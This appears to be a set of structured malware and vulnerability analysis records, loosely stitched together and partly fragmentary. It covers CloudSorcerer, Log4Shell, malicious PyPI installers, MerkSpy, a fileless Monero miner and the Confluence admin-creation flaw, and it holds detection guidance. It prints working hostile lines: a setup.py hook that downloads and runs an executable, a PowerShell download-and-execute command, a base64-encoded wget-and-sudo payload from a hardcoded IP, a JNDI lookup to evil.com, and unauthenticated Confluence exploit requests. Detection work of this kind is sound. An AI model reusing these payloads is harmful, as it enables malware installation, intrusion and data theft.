package_info.why_malicious: CloudSorcerer is a sophisticated malware family that abuses legitimate cloud service APIs (including Microsoft Graph, Yandex.Cloud, Dropbox, and GitHub) as covert command-and-control (C2) channels. It collects sensitive system information, injects shellcode into other processes, and exfiltrates data. The malware adapts its behavior based on the host process, impersonates legitimate traffic, switches C2 channels for resilience, and employs anti-detection techniques such as in-memory execution and obfuscated configuration.

execution_context.file_location: C-based PE binary (main execution logic, in-memory)

malicious_snippets.code_language: C (pseudocode, as actual code not provided)
malicious_snippets.code_behavior: At runtime, the code checks the current process name, adapts its technical actions accordingly: if running as mspaint.exe, it collects system information, executes C2 commands, and exfiltrates data; if running as any process except msiexec.exe, it injects shellcode into a target process; if running as msiexec.exe, it initiates C2 communication. This results in process-masquerading, covert persistence, and flexible malicious outcomes.

malice_analysis.why_suspicious: The code's process-aware behavior enables it to evade detection and perform targeted malicious actions depending on the host process, a hallmark of advanced persistent threats.
malice_analysis.violated_expectations: Legitimate binaries do not alter their core functionality based on the process name, nor do they inject shellcode or initiate C2 communications in this covert, context-dependent manner.
malice_analysis.similar_legitimate_use: Some security or debugging tools may inject code for analysis, but they do not do so covertly or based on process name masquerading, nor do they exfiltrate data or establish C2 channels.
key_indicators: Conditional logic based on process name
Shellcode injection into other processes
Activation of backdoor functionality in non-standard processes
Initiation of C2 communication from unexpected process contexts

execution_context.trigger: runtime (C2 communication loop after initial setup)
execution_context.file_location: C-based PE binary (network communication module, in-memory)

malicious_snippets.code_language: C (pseudocode, as actual code not provided)
malicious_snippets.code_behavior: At runtime, the code decodes a hidden C2 URL and authentication token from an obfuscated charcode table, establishes a connection to a cloud service API using these credentials, enters a loop to receive commands from the cloud-based C2, executes the received commands, and uploads the results back to the cloud, enabling covert C2 communication and data exfiltration.

malice_analysis.why_suspicious: The use of obfuscated configuration data to hide C2 endpoints and tokens, combined with leveraging legitimate cloud APIs for C2, is a sophisticated evasion and persistence technique.
malice_analysis.violated_expectations: Normal applications do not hide C2 endpoints or authentication tokens in obfuscated tables, nor do they use cloud APIs for unauthorized command execution and data exfiltration.
malice_analysis.similar_legitimate_use: Legitimate applications may use cloud APIs, but not for hidden, unauthorized C2 communication or to execute arbitrary commands received from external sources.

Use of cloud service APIs (Microsoft Graph, Yandex.Cloud, Dropbox, GitHub) for C2
Dynamic switching between multiple cloud services for resilience
Continuous command execution and result exfiltration via cloud APIs

package_info.why_malicious: Older versions of Log4j (prior to 2.17.1) contain a critical vulnerability (Log4Shell, CVE-2021-44228 and related CVEs) that allows attackers to inject specially crafted log messages containing JNDI lookups. When these messages are processed, Log4j performs remote lookups and can load and execute attacker-controlled code, resulting in arbitrary code execution on the target system. This makes affected versions of the package highly exploitable and dangerous in production environments.

execution_context.trigger: runtime (when a log message containing a JNDI pattern is processed by Log4j)
execution_context.file_location: application code using a vulnerable Log4j version (e.g., logger.error(...) in business logic or controller files)

malicious_snippets.code_snippet: logger.error("Output:" + "${jndi:ldap://evil.com:9999/Evil}");
malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI pattern is processed, Log4j interprets the ${jndi:ldap://evil.com:9999/Evil} expression, initiates an outbound LDAP network request to the attacker-controlled server, retrieves a reference to a remote Java class, and loads it, resulting in the execution of attacker-supplied code.

malice_analysis.why_suspicious: The log message includes a JNDI lookup pattern (${jndi:ldap://...}), which Log4j automatically resolves by making a network request to the specified LDAP server. This behavior allows attackers to trigger remote code execution by injecting such patterns into log messages.
malice_analysis.violated_expectations: Logging frameworks are expected to treat log message content as inert data and should not perform network lookups or execute code based on log message content. The automatic resolution of JNDI lookups in log messages violates this expectation and introduces a critical security risk.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimately used in enterprise Java applications for resource discovery and configuration, but not within the context of log message parsing or processing by a logging framework.
key_indicators: Presence of ${jndi:...} patterns in log messages
Automatic outbound LDAP or RMI network requests initiated by log processing
Log4j configuration allowing JNDI lookups in message patterns
Unexpected class loading or deserialization triggered by log message content

execution_context.trigger: runtime (immediately after Log4j loads and executes the remote Java class via JNDI lookup)
execution_context.file_location: remote Java class file served by the attacker's LDAP/HTTP server (e.g., Evil.class)

malicious_snippets.code_behavior: At runtime, after Log4j loads and executes the remote Java class via JNDI, the code constructs a shell command array, invokes Runtime.getRuntime().exec to execute the command, writes the string 'PWNED' to /tmp/pwned on the victim system, and demonstrates successful arbitrary command execution.

malice_analysis.why_suspicious: The code executes a shell command on the victim system as soon as the malicious class is loaded, which is a direct indicator of remote code execution. The command writes to a file, providing a clear sign of compromise.
malice_analysis.violated_expectations: Deserialized or remotely loaded classes should not be executed without strict validation, and logging frameworks should never enable arbitrary code execution as a result of log message processing.
malice_analysis.similar_legitimate_use: Runtime.getRuntime().exec may be used in legitimate applications for controlled subprocess management, but it is never appropriate for code loaded from untrusted remote sources or as a result of log message content.
key_indicators: Deserialization or loading of Java classes from remote, untrusted sources
Use of Runtime.getRuntime().exec with attacker-controlled input
Creation of files (e.g., /tmp/pwned) or execution of commands not present in the original application logic
Process execution triggered by log message processing

package_info.why_malicious: This report does not analyze a specific malicious package, but instead highlights the macro-level risk of modern software supply chain attacks. It details how attackers can embed malicious code in both open-source and internal packages, exfiltrate secrets, and tamper with binaries or metadata—often evading traditional AppSec tools. The report emphasizes that as software complexity and third-party dependencies increase, the risk of undetected malware, secrets exfiltration, and tampering grows across the entire supply chain.

package_info.why_malicious: A critical bug in npm v5.7.0 causes the package manager, when executed with sudo by a non-root user, to recursively change ownership of essential system directories (such as /, /etc, /usr, /boot) to the invoking user. This results in system instability, application failures, and potentially renders the system unbootable. The behavior is highly destructive and can be exploited for denial-of-service or privilege escalation attacks.

execution_context.trigger: At runtime, when npm v5.7.0 is executed with sudo by a non-root user (e.g., 'sudo npm install -g <package>')
execution_context.file_location: npm CLI core logic (exact file not specified in report, but part of npm v5.7.0 source code responsible for permission handling)
required_permissions: ability to execute npm commands as a non-root user with sudo

malicious_snippets.code_snippet: The code recursively performs a chown operation, changing the ownership of system directories such as /, /etc, /usr, /boot, and their contents to the non-root user who invoked the 'sudo npm' command.
malicious_snippets.code_behavior: When npm is executed with sudo by a non-root user, the code recursively changes ownership of critical system directories (/, /etc, /usr, /boot) and their contents to the invoking user, resulting in system files being owned by the wrong user and causing system instability, application failures, or an unbootable system.

malice_analysis.why_suspicious: Recursively changing ownership of entire system directories is highly destructive and not expected from a package manager. This action can render the system unusable, disrupt core services, and is a classic vector for denial-of-service or privilege escalation.
malice_analysis.violated_expectations: Normal npm operations should only modify files within the user's project directory or global npm modules (e.g., /usr/local/lib/node_modules). The actual behavior modifies ownership of the entire filesystem, far outside npm's intended scope.
malice_analysis.similar_legitimate_use: Legitimate use of chown may occur during package installation to set correct permissions on files npm installs, but never on system directories or files outside npm's installation scope.
key_indicators: Recursive chown operation initiated by npm on /, /etc, /usr, /boot
Ownership of system directories and files changed to non-root user
Triggered specifically by 'sudo npm' commands run by non-root users

package_info.why_malicious: Vulnerable versions of the commons-collections Java library contain a deserialization flaw (CVE-2015-6420) that enables remote code execution (RCE) when untrusted data is deserialized. Attackers can exploit this vulnerability by sending specially crafted serialized objects, which, when deserialized by the application, can execute arbitrary code on the server. This makes the use of these versions a critical security risk in any application that processes untrusted serialized data.

execution_context.trigger: At runtime, when the application deserializes untrusted input
execution_context.file_location: Any Java code path that deserializes objects using ObjectInputStream and includes vulnerable commons-collections classes (e.g., ObjectInputStream.readObject() in application logic, controllers, or utility classes)
required_permissions: Read access to serialized data (filesystem or network input)
Network access (if deserialization is triggered by remote input)

malicious_snippets.code_snippet:

malicious_snippets.code_behavior: At runtime, the code deserializes attacker-supplied input using ObjectInputStream and vulnerable commons-collections classes, allowing a crafted payload to traverse the deserialization process, resulting in arbitrary code execution on the server.

malice_analysis.why_suspicious: Deserializing untrusted data using ObjectInputStream in the presence of vulnerable commons-collections classes is a well-documented vector for remote code execution. Attackers can supply malicious serialized objects that exploit the library's gadget chains to execute arbitrary commands.
malice_analysis.violated_expectations: Normal application code should only deserialize trusted, validated data and should avoid using known-vulnerable libraries. Here, the code processes untrusted input without validation, directly exposing the application to RCE.
malice_analysis.similar_legitimate_use: Deserialization is legitimate when restricted to trusted sources and safe object types, such as internal communication or storage of application state, with strict type checks and no exposure to user-controlled input.
key_indicators: Deserialization of data from untrusted or external sources
Use of ObjectInputStream without input validation or type restriction
Presence of vulnerable commons-collections classes (e.g., InvokerTransformer, Transformer, ChainedTransformer) in the classpath
No safeguards (such as a custom ObjectInputStream or whitelisting of allowed classes)

attack_chain.action: Attacker sends a crafted serialized Java object payload to the application via an input vector such as HTTP request, file upload, or network socket.
attack_chain.leads_to: Application receives and processes the malicious serialized input.

attack_chain.leads_to: Malicious code embedded in the serialized payload is executed during deserialization.

attack_chain.action: Arbitrary code execution occurs on the server as a result of the deserialization process, potentially allowing the attacker to compromise the system.
attack_chain.leads_to: Attacker achieves remote code execution and may gain full control of the affected server.

behavioral_signatures: Deserialization of untrusted data using ObjectInputStream in application code
Presence and use of vulnerable commons-collections classes (e.g., InvokerTransformer, Transformer, ChainedTransformer) in the classpath
Unexpected process launches (e.g., Runtime.exec) or network connections initiated during or immediately after deserialization

detection_knowledge.how_to_detect: Scan application dependencies for vulnerable versions of commons-collections (3.2.1 and earlier). Audit code for deserialization of untrusted input using ObjectInputStream, especially in endpoints or file processing logic. Instrument runtime environments to monitor for unexpected process execution or network activity during deserialization. Block or alert on inbound traffic containing serialized Java objects unless explicitly required and secured. Implement class whitelisting or custom deserialization logic to restrict allowed object types.

malice_analysis.violated_expectations: Build scripts and CI/CD configurations should not access or transmit private keys or credentials outside the trusted environment. Such actions violate standard security practices.
malice_analysis.similar_legitimate_use: Legitimate scripts may use SSH keys for deployment or authentication, but should never exfiltrate them or send them to untrusted endpoints.

Use of command-line tools (e.g., curl) to send data externally
Presence of exfiltration logic in CI/CD or build configuration files
Outbound HTTP POST requests to hardcoded, untrusted domains

package_info.why_malicious: The update mechanism of the NoxPlayer Android emulator was compromised as part of Operation NightScout, enabling attackers to deliver malicious payloads through legitimate software updates. This supply-chain attack targeted millions of users, primarily in online-gaming communities across Asia, and resulted in the installation of malware that enabled espionage, unauthorized remote access, and persistent compromise of affected systems.

execution_context.trigger: During update-time (when the NoxPlayer application checks for and applies updates)
execution_context.file_location: NoxPlayer update package (delivered via the official update channel, but compromised at the source)

malicious_snippets.code_snippet: The malicious update package, when executed by the NoxPlayer updater, downloads additional malware binaries from attacker-controlled servers, writes them to disk, and executes them without user consent. The payload establishes persistence and enables remote access for espionage.
malicious_snippets.code_language: Windows executable (likely PE format) and/or script (exact language not specified in report)
malicious_snippets.code_behavior: During update-time, the compromised updater downloads additional binaries from attacker-controlled servers, writes them to disk, and executes them, resulting in persistent remote access and enabling espionage on the victim system.

malice_analysis.why_suspicious: The update process downloads and executes binaries from domains not associated with the official NoxPlayer infrastructure, bypassing signature verification and user consent. This is a hallmark of supply-chain attacks and is highly anomalous for legitimate software updates.
malice_analysis.violated_expectations: Legitimate update mechanisms only download and execute updates that are cryptographically signed and verified by the vendor, and do not fetch or run arbitrary binaries from external, untrusted sources. In this case, the updater was abused to deliver and execute unsigned, unexpected payloads.
malice_analysis.similar_legitimate_use: Software updaters may download and install updates, but only from trusted, verified sources and with proper signature validation. Downloading and executing arbitrary code from unknown servers is never legitimate.
key_indicators: Update process initiates network connections to non-official or previously unknown domains/IPs during update
Unsigned or unexpected binaries are written to disk and executed by the updater
No user notification or consent for the execution of additional payloads
Update package contents differ from official manifests or lack proper digital signatures

detection_knowledge.how_to_detect: Monitor the NoxPlayer update process for network activity to non-official domains or IPs, especially during update events. Validate the digital signatures and hashes of update packages and all binaries written to disk. Alert if the updater writes or executes files not present in official manifests or if unsigned executables are launched. Correlate process creation events with update activity to detect unauthorized payload execution.

malicious_snippets.code_snippet:
from setuptools import setup, find_packages
import os
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get('https://linkedopports.com/pyp/resp.php?live=Installation ' + env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass

class PostInstallCommand(install):
    def run(self):
        send()
        install.run(self)
malicious_snippets.code_behavior: During postinstall, the code collects the COMPUTERNAME environment variable and sends it to a remote server via HTTP GET, then downloads a Windows executable from a suspicious domain and executes it, resulting in remote code execution and potential further compromise.

malice_analysis.why_suspicious: The code exfiltrates host-specific information to an external attacker-controlled domain and downloads and executes a remote binary during the installation process, which is highly abnormal and dangerous for Python packages.
malice_analysis.violated_expectations: Normal setup.py scripts are only expected to handle package installation logic and should not perform network exfiltration or download and execute arbitrary binaries from external sources.
malice_analysis.similar_legitimate_use: Some legitimate packages may download dependencies, but they do not download and execute arbitrary executables from unrelated domains or exfiltrate environment data to external servers.
key_indicators: Outbound HTTP request to linkedopports.com during installation
Download and execution of .scr or .exe file from python-release.com
Access and exfiltration of COMPUTERNAME environment variable

malice_analysis.why_suspicious: Authorization is based solely on a user-controlled query parameter, which can be easily manipulated by an attacker to gain unauthorized access.
malice_analysis.violated_expectations: Normal behavior would validate the user's session or role on the server side, not rely on client-supplied parameters for access control.
malice_analysis.similar_legitimate_use: Query parameters are sometimes used for feature toggles in non-sensitive contexts, but never for access control to privileged functionality.

package_info.why_malicious: All three packages contain identical malicious code in their setup.py scripts that downloads and executes a remote binary (Oxzy.exe) from a Dropbox URL during installation. This initiates a multi-stage infection chain, with each stage dropping and executing further malicious binaries (update.exe and SearchProtocolHost.exe) in the user's temp directories. The packages impersonate legitimate libraries but are solely designed to deliver and execute malware on the victim's system.

malicious_snippets.code_snippet: os.system('powershell -Command "Invoke-WebRequest -Uri https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0 -OutFile Oxzy.exe; Start-Process Oxzy.exe"')
malicious_snippets.code_behavior: During package installation (setup.py execution), the code invokes PowerShell to download Oxzy.exe from a remote Dropbox URL, writes it to the local filesystem, and immediately executes it, resulting in remote code execution and the start of a multi-stage malware infection.

malice_analysis.why_suspicious: The setup.py script executes a PowerShell command to download and run an external executable from an untrusted remote source, which is highly atypical and dangerous during package installation.
malice_analysis.violated_expectations: Legitimate setup.py scripts are only expected to manage package installation and dependencies, not to download and execute arbitrary binaries from the internet.
malice_analysis.similar_legitimate_use: Some legitimate packages may download Python dependencies, but they do not download and execute arbitrary Windows executables from file-sharing services.

Download of executable from external Dropbox URL

malice_analysis.why_suspicious: Dropping and executing additional binaries is a common malware tactic for persistence, evasion, and multi-stage payload delivery.
malice_analysis.violated_expectations: Legitimate installers do not drop and execute hidden or secondary binaries in user temp directories without user consent or transparency.
malice_analysis.similar_legitimate_use: Some software updaters may temporarily write files to temp directories, but not in a covert or chained manner, nor do they execute hidden payloads.

package_info.why_malicious: UltiMaker Cura is vulnerable to arbitrary code execution due to the use of unsanitized eval() on attacker-controlled data from 3MF model files. This allows a malicious 3MF file to execute arbitrary Python code on the victim's machine as soon as the file is loaded, without any user interaction beyond opening the file. The vulnerability enables full compromise of the system running Cura.

if key == "drop_to_buildplate":

malice_analysis.why_suspicious: The code uses eval() directly on data loaded from a user-supplied 3MF file, allowing arbitrary Python code execution. This is a textbook code injection vulnerability.

malice_analysis.why_suspicious: Mining cryptocurrency without user consent is a clear sign of malicious intent. The process is hidden and consumes significant system resources.
malice_analysis.violated_expectations: Legitimate software does not hijack system resources for unauthorized mining or spawn hidden mining processes.
malice_analysis.similar_legitimate_use: Legitimate mining software performs similar actions but only with explicit user consent and transparency.

package_info.why_malicious: MerkSpy is a sophisticated spyware payload delivered through a malicious Office document exploiting CVE-2021-40444. It covertly monitors user activity, exfiltrates sensitive data, achieves persistence via registry modification, injects itself into system processes, and steals credentials and cryptocurrency wallet data, all without user consent or user awareness.

malicious_snippets.code_snippet: URL: hxxp://45[.]89[.]53[.]46/google/olerender[.]html
malicious_snippets.code_behavior: At document-open, the embedded URL is triggered, causing the Office application to fetch a remote HTML payload from the attacker's server, which initiates the exploit chain and leads to code execution.

malice_analysis.why_suspicious: Embedding a hidden URL in Office document XML that triggers remote code execution is a clear abuse of document functionality for exploitation.
malice_analysis.violated_expectations: Normal Office documents do not contain hidden URLs that automatically fetch and execute remote HTML payloads upon opening.
malice_analysis.similar_legitimate_use: Document templates may reference remote resources for legitimate content, but not executable HTML payloads or code.
key_indicators: Hidden URL in Office XML relationships file
Automatic remote HTML payload delivery on document open
Reference to suspicious external IP address

malicious_snippets.code_behavior: During HTML rendering, the JavaScript checks the system architecture, extracts the appropriate embedded shellcode, modifies memory permissions to EXECUTE_READWRITE using VirtualProtect, and spawns a new thread with CreateThread to execute the shellcode, enabling further payload download and execution.

malice_analysis.why_suspicious: HTML files should not contain or execute shellcode, nor perform memory permission changes or spawn threads, which are techniques used to bypass security controls and execute arbitrary code.
malice_analysis.violated_expectations: Legitimate HTML/JavaScript in Office or IE context should not perform process injection, memory manipulation, or direct shellcode execution.
malice_analysis.similar_legitimate_use: No legitimate use case exists for HTML/JavaScript in Office documents to perform these actions; these are classic malware exploitation techniques.
key_indicators: Shellcode embedded within HTML file
Use of VirtualProtect to change memory permissions
CreateThread API call from JavaScript context
System architecture check for payload selection

malicious_snippets.code_behavior: At shellcode execution, the code downloads an encoded payload ('GoogleUpdate') from the attacker's server, decodes it using a custom XOR routine with a specific key and increment, and then executes the resulting binary in memory, resulting in the installation of the MerkSpy spyware.

malice_analysis.why_suspicious: Shellcode that downloads, decodes, and executes a binary in memory is a hallmark of malware loaders and is used to evade detection and disk-based defenses.
malice_analysis.violated_expectations: No legitimate process should download and execute obfuscated binaries via shellcode, especially using custom decoding routines.
malice_analysis.similar_legitimate_use: Software updaters may download executables, but not via shellcode, not with obfuscation, and not without user interaction or consent.
key_indicators: Custom XOR decoding of downloaded payload
In-memory execution of decoded binary
Use of misleading filename ('GoogleUpdate') for malicious payload

execution_context.file_location: GoogleUpdate.exe (dropped to disk, injected into system processes)

malicious_snippets.code_behavior: At payload execution, the spyware injects itself into system processes (such as explorer.exe), creates a registry Run key for persistence, monitors keystrokes, captures screenshots, steals Chrome credentials and MetaMask extension data, and prepares collected data for exfiltration to the attacker's server.

malice_analysis.why_suspicious: Process injection, credential theft, and covert data exfiltration are all classic spyware behaviors that violate user privacy and system integrity.
malice_analysis.violated_expectations: Legitimate software does not inject into system processes, steal user credentials, or exfiltrate sensitive data without explicit user consent.
malice_analysis.similar_legitimate_use: Enterprise monitoring tools may capture some user activity, but only with user consent, clear notification, and without exfiltrating data to untrusted servers.
key_indicators: Registry Run key for persistence (GoogleUpdate.exe)
Process injection into explorer.exe and other system processes
Keystroke logging and screenshot capture routines
Credential and browser extension data theft
Preparation for network exfiltration to hardcoded C2

detection_knowledge.how_to_detect: Monitor for Office documents that trigger downloads of remote HTML or executables, especially those referencing suspicious IPs or domains in _rels/document.xml. package_info.why_malicious: The package is malicious because it covertly executes a cryptominer on Linux systems by downloading and running a remote ELF binary in-memory during installation, using fileless malware techniques to evade detection. It provides no legitimate functionality, impersonates a real software engineer to appear trustworthy, and abuses installation privileges to compromise user systems.

malicious_snippets.code_snippet: os.system(b64decode(b'c3VkbyBhcHQgLXkgaW5zdGFsbCB3ZXRnIGNwdWxpbWl0ID4gL2Rldi9udWxsIDI+JjEgJiYgd2dldCAtcCBodHRwOi8vNS4xNjEuNTcuMjUwL3RveCAmJiBjaG1vZCAreCAuL3RveCAmJiB0aW1lb3V0IC1rIDVzIDEgaCAmJiBzdWRvIC4vdG94ICZhbSBybS4vdG94').decode())
malicious_snippets.code_behavior: During installation, the code decodes a base64-encoded shell command, installs system utilities (wget, cpulimit), downloads a remote ELF binary ('tox') from a hardcoded IP address, grants it execute permissions, runs it with sudo privileges, and deletes the binary after execution, resulting in covert execution of a malicious payload.

malice_analysis.why_suspicious: The code is suspicious because it executes obfuscated, base64-encoded shell commands that download and run an untrusted binary from a remote server with elevated privileges, then deletes the evidence to hinder forensic analysis.
malice_analysis.violated_expectations: A setup.py script should only handle package installation and dependency management, not download and execute remote binaries, require sudo/root access, or perform system-level modifications.
malice_analysis.similar_legitimate_use: Some legitimate packages may install Python dependencies or download data files, but they do not download and execute untrusted executables from arbitrary IP addresses or require root privileges.
key_indicators: Base64-encoded shell commands in setup.py
Silent installation of system utilities (wget, cpulimit) during install
Download and execution of remote ELF binary from hardcoded IP
Immediate deletion of the downloaded binary after execution
Use of sudo/root privileges in install script

malicious_snippets.code_snippet: ELF binary 'tox' (stripped, downloaded from http://5.161.57.250/tox)
malicious_snippets.code_behavior: After installation, the downloaded 'tox' ELF binary is executed as a subprocess, uses the memfd_create syscall to create an anonymous in-memory file, writes a second ELF binary (Monero cryptominer) into memory, and executes it directly without writing to disk, resulting in fileless malware execution.

malice_analysis.why_suspicious: The binary is stripped to evade static analysis and uses advanced fileless malware techniques, specifically memfd_create, to execute a cryptominer in-memory, leaving minimal forensic evidence and avoiding detection by traditional file-based scanners.
malice_analysis.violated_expectations: A legitimate installer or dependency should not execute hidden binaries, use syscalls for covert in-memory execution, or inject code into memory for the purpose of cryptomining.
malice_analysis.similar_legitimate_use: memfd_create can be used for legitimate in-memory operations, such as temporary file handling in trusted applications, but not for covertly executing cryptominers or other payloads.
key_indicators: Stripped ELF binary executed postinstall
memfd_create syscall usage for in-memory execution
No disk artifacts for the cryptominer payload
Network communication to hardcoded IP address

malicious_snippets.code_snippet: ELF Monero cryptominer (dropped in-memory, detected as /memfd: (deleted))
malicious_snippets.code_behavior: At runtime, the in-memory cryptominer process, executed from an anonymous file descriptor, uses system CPU resources to mine Monero (XMR), communicates with external mining pools, and employs cpulimit to throttle CPU usage, resulting in covert resource theft and reduced likelihood of detection.

malice_analysis.why_suspicious: The process is injected directly into memory, never touches disk, and is designed to mine cryptocurrency covertly, using resource throttling to evade suspicion and avoid detection by system monitoring tools.
malice_analysis.violated_expectations: No legitimate package should mine cryptocurrency on user systems, hide its activity in memory, or use resource throttling to avoid detection.
malice_analysis.similar_legitimate_use: There are no legitimate use cases for cryptomining on user systems without explicit user consent; in-memory execution of cryptominers is always malicious.
key_indicators: In-memory ELF process detected as '/memfd: (deleted)'
Active cryptomining activity (Monero/XMR) on user system
Resource throttling via cpulimit
No disk artifacts for the cryptominer

detection_knowledge.how_to_detect: Monitor for base64-encoded or obfuscated shell commands in setup.py or install scripts, especially those that download and execute remote binaries. Detect use of memfd_create and the presence of in-memory ELF processes (e.g., '/memfd: (deleted)'). Watch for unexpected installation of system utilities (wget, cpulimit) during package installation. Monitor for outbound connections to known malicious IPs (e.g., 5.161.57.250) and for cryptomining network traffic. Alert on any package that requests sudo/root privileges during installation. Correlate these behaviors to identify fileless cryptomining attacks.

This behavior is not expected in legitimate packages and poses a significant risk of credential theft.

malicious_snippets.code_behavior: During installation, the code reads the user's ~/.ssh/id_rsa and ~/.aws/credentials files and sends their contents via HTTPS POST to https://malicious.example.com/upload, resulting in credential exfiltration.

Static analysis of setup.py for file access and network exfiltration code, combined with runtime monitoring of file and network activity during installation, can reliably detect this threat.

package_info.why_malicious: These versions contain a broken access control vulnerability (CVE-2023-22515) that allows unauthenticated attackers to re-enable the setup process and create new administrator accounts, granting full control of the Confluence instance to unauthorized users. This enables privilege escalation and persistent compromise of the affected system.

malicious_snippets.code_snippet: GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
malicious_snippets.code_behavior: Upon receiving an unauthenticated HTTP GET request to /server-info.action with the setupComplete parameter set to false, the application disables the setup completion flag, re-enabling the setup process and exposing setup endpoints to unauthenticated users.

malice_analysis.why_suspicious: Allowing an unauthenticated GET request to re-enable the setup process exposes critical administrative functionality to attackers, bypassing expected access controls.
malice_analysis.violated_expectations: Normally, setup endpoints are locked after initial configuration and require authentication; this behavior allows bypassing that restriction and exposes sensitive setup functionality to unauthenticated users.
malice_analysis.similar_legitimate_use: Initial installation or legitimate reconfiguration by an authenticated administrator during the first-time setup process.
key_indicators: Unauthenticated GET request to /server-info.action with setupComplete parameter set to false or 0
Access to setup-related endpoints without prior authentication
Modification of setupComplete state via HTTP request

execution_context.trigger: unauthenticated HTTP request after setup re-enabled

malicious_snippets.code_snippet: POST /setup/setupadministrator.action
malicious_snippets.code_behavior: After the setup process is re-enabled, an unauthenticated HTTP POST request to /setup/setupadministrator.action is processed by the application, allowing the creation of a new administrator account without requiring prior authentication, resulting in privilege escalation.

malice_analysis.why_suspicious: Creating administrator accounts should require authentication and strict access controls; allowing unauthenticated creation of admin users enables attackers to gain full control of the application.
malice_analysis.violated_expectations: Normal behavior is that only authenticated users or those in a secure setup state can create admin accounts; this bypasses that control and allows arbitrary admin creation.
malice_analysis.similar_legitimate_use: Legitimate setup process during initial installation, when no admin accounts exist and setup is expected to be open.
key_indicators: Unauthenticated POST request to /setup/setupadministrator.action
Creation of new administrator accounts outside of normal provisioning workflows
Admin user creation events not associated with authenticated sessions

execution_context.trigger: optional unauthenticated HTTP request after admin creation

malicious_snippets.code_snippet: POST /setup/finishsetup.action
malicious_snippets.code_behavior: Following the creation of a new administrator account, an unauthenticated HTTP POST request to /setup/finishsetup.action finalizes the setup process, re-locking the setup endpoints and potentially concealing evidence of exploitation by restoring the application to a post-setup state.

malice_analysis.why_suspicious: Finalizing the setup process without authentication allows attackers to cover their tracks by closing the setup window after malicious admin creation, making detection more difficult.
malice_analysis.violated_expectations: Setup finalization should be restricted to authenticated users and not accessible post-setup; this behavior allows unauthenticated users to manipulate the application state.
malice_analysis.similar_legitimate_use: Legitimate finalization during initial setup by an administrator completing the installation process.
key_indicators: Unauthenticated POST request to /setup/finishsetup.action
Setup process manipulation after initial installation
Transition of setup state without corresponding authenticated user activity

attack_chain.action: Attacker sends an unauthenticated GET request to /server-info.action with setupComplete=false to re-enable the setup process.
attack_chain.leads_to: Allows access to setup endpoints without authentication, exposing administrative setup functionality.

attack_chain.action: Attacker sends an unauthenticated POST request to /setup/setupadministrator.action to create a new administrator account.
attack_chain.leads_to: Attacker gains administrator access to the Confluence instance, enabling full control over the application.

attack_chain.action: Attacker optionally sends an unauthenticated POST request to /setup/finishsetup.action to finalize the setup and potentially hide evidence of exploitation.
attack_chain.leads_to: Setup process is closed, attacker retains admin access, and evidence of the attack may be concealed.

behavioral_signatures: Unauthenticated GET requests to /server-info.action with setupComplete parameter set to false or 0
Unauthenticated POST requests to /setup/setupadministrator.action
Creation of new administrator accounts outside of normal provisioning workflows or without corresponding authenticated sessions
Unauthenticated POST requests to /setup/finishsetup.action
Sequence of unauthenticated requests to setup endpoints in a short time window
file_indicators: Audit logs showing new admin user creation not linked to authenticated sessions
Access logs with /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false or setupComplete=0

Access logs with POST /setup/finishsetup.action

detection_knowledge.how_to_detect: Monitor HTTP access logs for unauthenticated requests to /server-info.action with setupComplete=false or 0, and POST requests to /setup/setupadministrator.action and /setup/finishsetup.action. Correlate these events with the creation of new administrator accounts, especially if the account creation is not associated with an authenticated session. Flag any such activity, particularly if originating from known malicious IP addresses or using suspicious user agents. Review admin user creation logs for unexpected or suspicious accounts, and investigate sequences of unauthenticated requests to setup endpoints within a short time frame.

It employs multiple evasion techniques, persistence mechanisms, and exfiltrates sensitive data to attacker-controlled C&C servers. The malware is distributed via phishing emails containing malicious Office attachments, and leverages disguised file extensions and anti-analysis checks to evade detection.

execution_context.trigger: User opens malicious Office document (XLS/CSV attachment)
execution_context.file_location: BIFF5-format XLS file (External Reference record) or CSV file (Formula injection)

malicious_snippets.code_snippet: cmd /c powershell –executionpolicy bypass –W Hidden –command "[download JAR file zpmqwjs.docx]"
malicious_snippets.code_behavior: When the user opens the malicious Office document, the code executes a hidden PowerShell command via cmd to download a JAR file from a remote server, writing the file to disk and enabling the next stage of malware execution.

malice_analysis.why_suspicious: Office documents should not execute hidden PowerShell commands to download and save executable content from the internet.
malice_analysis.violated_expectations: Normal Office documents do not trigger shell or PowerShell commands, nor do they download or execute files without explicit user action.
malice_analysis.similar_legitimate_use: Automated document processing in enterprise environments may use macros, but never to download JAR files disguised as documents.
key_indicators: Hidden PowerShell execution from Office document
Download of JAR file with misleading extension (e.g., .docx)
Use of legacy BIFF5 format and junk characters for evasion
Formula injection or external reference abuse

malicious_snippets.code_snippet: Obfuscated Java code using dynamic invocation and decryption function Gv; locale/language/country checks; public IP and geolocation checks via checkip.amazonaws.com and ipinfo.io.
malicious_snippets.code_behavior: Upon execution of the JAR file, the code decrypts and dynamically invokes functions to check the system's locale, language, and country, then queries external services to determine the public IP and geolocation. If the system is not located in Turkey, the malware proceeds to execute its payload.

malice_analysis.why_suspicious: Malware frequently uses locale and geolocation checks to evade analysis and avoid infecting systems in specific regions.
malice_analysis.violated_expectations: Legitimate Java applications do not perform anti-analysis checks or restrict execution based on country or language settings.
malice_analysis.similar_legitimate_use: Region-locked software (e.g., DRM enforcement), but not for evasion or anti-analysis.
key_indicators: Obfuscated Java code with dynamic invocation and decryption routines
Locale, language, and country checks at runtime
External IP and geolocation queries to checkip.amazonaws.com and ipinfo.io
Conditional execution based on geolocation

malicious_snippets.code_snippet: WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
malicious_snippets.code_behavior: After passing evasion checks, the code executes a WMIC command to enumerate installed antivirus products on the system, collects the results, and sends this information to the attacker's C&C server for reconnaissance.

malice_analysis.why_suspicious: Malware commonly enumerates security products to tailor attacks, disable defenses, or evade detection.
malice_analysis.violated_expectations: Legitimate software rarely needs to enumerate antivirus products, especially without user consent.
malice_analysis.similar_legitimate_use: Enterprise inventory or asset management tools may query security products, but with user awareness and consent.
key_indicators: WMIC query for antivirus product enumeration
